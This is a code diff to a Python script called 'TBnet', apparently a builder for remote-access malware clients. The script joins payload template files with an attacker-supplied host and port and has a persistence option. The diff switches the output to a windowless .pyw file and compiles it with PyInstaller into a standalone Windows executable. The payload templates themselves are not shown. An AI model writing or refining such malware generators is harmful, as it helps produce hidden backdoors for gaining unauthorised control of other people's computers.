@@ -1,4 +1,6 @@
 import argparse
+import subprocess
+import os
 
 parser = argparse.ArgumentParser(description='TBnet Help Menu')
 parser.add_argument('--host', type=str, required=True, dest='host',\
@@ -18,12 +20,14 @@ class GenClient:
     pathDirOutput = "./output/"
 
     def GenererClient(self, ip, port, persistance, name):
-        fichier = open(self.pathDirOutput + name + ".py", "w")
+        fichier = open(self.pathDirOutput + name + ".pyw", "w")
         fichier.write(self.ReturnFichier("payload1.txt"))
         fichier.write("\n    host = \"" + ip + "\"\n    port = " + str(port) + "\n")
         fichier.write(self.ReturnFichier("payload2.txt"))
         fichier.close()
-
+        os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + name + ".pyw" + " -F --clean")
+        print("Client executable prêt : " + "./dist/" + name + ".exe")
+#"C:\Users\theoc\AppData\Local\Programs\Python\Python37\Scripts\pyinstaller.exe " + self.pathDirOutput + name + ".pyw" + " -F --clean"
     def ReturnFichier(self, nom_fichier):
         fichier = open(self.pathDirFichier + nom_fichier, "r")
         text = fichier.read()
@@ -31,29 +35,3 @@ class GenClient:
         return text
 
 GenClient().GenererClient(args.host, args.port, args.persistance, args.name)
-
-
-"""
-def ReturnInfo(macAdress, info_name):
-    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
-    data = json.load(fichier)
-    print(data[info_name])
-    info = data[info_name]
-    fichier.close
-    return info
-
-def TestMacAddress(path,extension,macAddress):
-    list_dir = []
-    list_dir = os.listdir(path)
-    count = 0
-    for file in list_dir:
-        if file.endswith(extension): # eg: '.txt'
-            count += 1
-            fileName, fileExtension = os.path.splitext(file)
-            if TrouverMac(fileName + fileExtension) == macAddress:
-                print("l'adresse mac corespond")
-                return True, fileName + fileExtension
-            else:
-                print("l'adresse mac ne corespond pas")
-    return False, "Null"
-"""
